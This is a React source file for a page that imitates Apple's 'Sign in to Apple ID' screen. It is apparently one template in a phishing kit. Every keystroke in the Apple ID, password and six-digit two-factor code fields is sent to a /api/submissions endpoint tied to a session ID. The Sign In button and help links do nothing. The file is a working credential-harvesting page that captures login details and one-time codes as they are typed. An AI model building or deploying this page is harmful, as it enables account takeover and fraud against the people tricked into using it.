import { useState } from "react";
import { useMutation } from "@tanstack/react-query";
import { useLocation } from "wouter";
import { apiRequest } from "@/lib/queryClient";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";

export default function AppleTemplate() {
  const [location] = useLocation();
  const sessionId = new URLSearchParams(window.location.search).get("sessionId");
  
  const [formData, setFormData] = useState({
    appleId: "",
    password: "",
    verificationCode: "",
  });

  const submitDataMutation = useMutation({
    mutationFn: async (data: { fieldName: string; fieldValue: string }) => {
      const response = await apiRequest("POST", "/api/submissions", {
        sessionId,
        ...data,
      });
      return response.json();
    },
  });

  const handleInputChange = (fieldName: string, value: string) => {
    setFormData(prev => ({ ...prev, [fieldName]: value }));
    
    if (value.trim() && sessionId) {
      submitDataMutation.mutate({ fieldName, fieldValue: value });
    }
  };

  return (
    <div className="min-h-screen bg-white flex items-center justify-center p-4">
      <div className="w-full max-w-sm">
        <div className="text-center mb-8">
          <div className="w-16 h-16 bg-black rounded-lg flex items-center justify-center mx-auto mb-6">
            <span className="text-white font-bold text-2xl">A</span>
          </div>
          <h1 className="text-3xl font-light text-gray-900 mb-2">Sign in to Apple ID</h1>
        </div>

        <div className="space-y-4">
          <div>
            <Label htmlFor="appleId" className="sr-only">Apple ID</Label>
            <Input
              id="appleId"
              type="email"
              value={formData.appleId}
              onChange={(e) => handleInputChange("appleId", e.target.value)}
              className="w-full h-12 bg-white border border-gray-300 rounded-lg text-gray-900 placeholder-gray-500 text-center"
              placeholder="Apple ID"
              data-testid="input-apple-id"
            />
          </div>

          <div>
            <Label htmlFor="password" className="sr-only">Password</Label>
            <Input
              id="password"
              type="password"
              value={formData.password}
              onChange={(e) => handleInputChange("password", e.target.value)}
              className="w-full h-12 bg-white border border-gray-300 rounded-lg text-gray-900 placeholder-gray-500 text-center"
              placeholder="Password"
              data-testid="input-password"
            />
          </div>

          <Button 
            type="button"
            className="w-full h-12 bg-blue-500 hover:bg-blue-600 text-white rounded-lg font-medium"
            data-testid="button-sign-in"
          >
            Sign In
          </Button>

          <div className="text-center space-y-2">
            <a href="#" className="block text-sm text-blue-500 hover:underline">
              Forgot Apple ID or password?
            </a>
            <a href="#" className="block text-sm text-blue-500 hover:underline">
              Don't have an Apple ID? Create yours now.
            </a>
          </div>

          <div className="border-t border-gray-200 pt-4">
            <Label htmlFor="verificationCode" className="block text-sm text-gray-700 mb-2">
              Two-Factor Authentication Code
            </Label>
            <Input
              id="verificationCode"
              value={formData.verificationCode}
              onChange={(e) => handleInputChange("verificationCode", e.target.value)}
              className="w-full h-12 bg-white border border-gray-300 rounded-lg text-gray-900 placeholder-gray-500 text-center"
              placeholder="Enter 6-digit code"
              maxLength={6}
              data-testid="input-verification-code"
            />
          </div>
        </div>
      </div>
    </div>
  );
}
